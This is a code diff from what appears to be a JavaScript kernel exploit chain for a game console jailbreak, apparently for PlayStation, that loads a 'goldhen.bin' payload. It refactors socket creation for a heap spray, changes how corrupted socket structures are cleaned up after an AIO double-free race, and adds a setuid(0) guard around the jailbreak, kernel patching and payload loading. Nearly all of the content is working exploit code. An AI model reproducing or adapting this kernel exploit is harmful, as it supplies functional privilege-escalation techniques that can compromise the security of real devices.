@@ -264,7 +264,7 @@ function find_twins() {
                 }
 
                 // replace twins with new sockets
-                ipv6_socks.push(make_udp6_sock(), make_udp6_sock());
+                ipv6_socks.push(make_socket(AF_INET6, SOCK_DGRAM), make_socket(AF_INET6, SOCK_DGRAM));
 
                 return;
             }
@@ -317,7 +317,7 @@ function make_pktopts_twins() {
                 // replace twins with new sockets, and add pktopts now while new allocs can't
                 // use the double freed memory
                 for (var k = 0; k < twins.length; k++) {
-                    var sock = make_udp6_sock();
+                    var sock = make_socket(AF_INET6, SOCK_DGRAM);
                     
                     if (setsockopt.invoke(sock, IPPROTO_IPV6, IPV6_TCLASS, tclass_addr, 4).eq(-1)) {
                         throw new SyscallError(`Unable to set socket option for fd ${sock} !!`);
@@ -367,7 +367,7 @@ function init() {
 
     // Setup sockets for spraying and initialize pktopts
     for (var i = 0; i < ipv6_socks.length; i++) {
-        ipv6_socks[i] = make_udp6_sock();
+        ipv6_socks[i] = make_socket(AF_INET6, SOCK_DGRAM);
     }
 
     log("Environment init completed !!");
@@ -447,7 +447,7 @@ function double_free_reqs2() {
     server_addr.sin_port = 0; // any
     server_addr.sin_addr = 0x7F000001.swap32(); // 127.0.0.1
 
-    var server_sock = make_tcp_sock();
+    var server_sock = make_socket(AF_INET, SOCK_STREAM);
     debug(`server_sock: ${server_sock}`);
 
     var optval_addr = alloc(4);
@@ -490,7 +490,7 @@ function double_free_reqs2() {
     for (var i = 0; i < RACE_NUM; i++) {
         debug(`Attempt AIO double free race...`);
 
-        var client_sock = make_tcp_sock();
+        var client_sock = make_socket(AF_INET, SOCK_STREAM);
         debug(`client_sock: ${client_sock}`);
 
         if (connect.invoke(client_sock, server_addr.addr, sockaddr_in.sizeof).eq(-1)) {
@@ -892,7 +892,7 @@ function double_free_reqs1() {
                         }
                     
                         // replace dirty with new sockets
-                        ipv6_socks.push(make_udp6_sock());
+                        ipv6_socks.push(make_socket(AF_INET6, SOCK_DGRAM));
 
                         break;
                     }
@@ -1153,40 +1153,37 @@ try {
 
     log("Corrupted context cleanup started...");
 
-    // remove pktinfo pointer from master twin 
+    // remove pktinfo pointer from master 
     remove_pktinfo_from_so(twins[0]);
 
-    // Remove rthdr pointer from twins
-    for (var i = 0; i < twins.length; i++) {
-        remove_rthdr_from_so(twins[i]);
-    }
-
-    // Remove rthdr pointer from dirty
+    // Remove rthdr pointer from slave and dirty
+    remove_rthdr_from_so(twins[1]);
     remove_rthdr_from_so(dirty_fd);
 
     log("Corrupted context cleanup complated !!");
-
-    // Find allproc
-    find_all_proc();
 } finally {
     cleanup();
 }
 
-// Read bin payload
-//var bin = read_file("/download0/hen.bin");
-var bin = read_file("/download0/goldhen.bin");
+// Find allproc
+find_all_proc();
 
-// Jailbreak
-jailbreak();
+// Avoid reapplying if already done 
+if (setuid.invoke(0).eq(-1)) {
+    // Read bin payload
+    //var bin = read_file("/download0/hen.bin");
+    var bin = read_file("/download0/goldhen.bin");
 
-var shellcode = atob(KernelMisc.SHELLCODE(version));
+    // Jailbreak
+    jailbreak();
 
-// Kernel patches
-kernel_patches(shellcode);
+    // Kernel patches
+    kernel_patches();
 
-notify("Jailbreak successfull !!");
+    notify("Jailbreak successfull !!");
 
-// Load bin payload
-load_bin(bin);
+    // Load bin payload
+    load_bin(bin);
+}
 
 log("===END===");
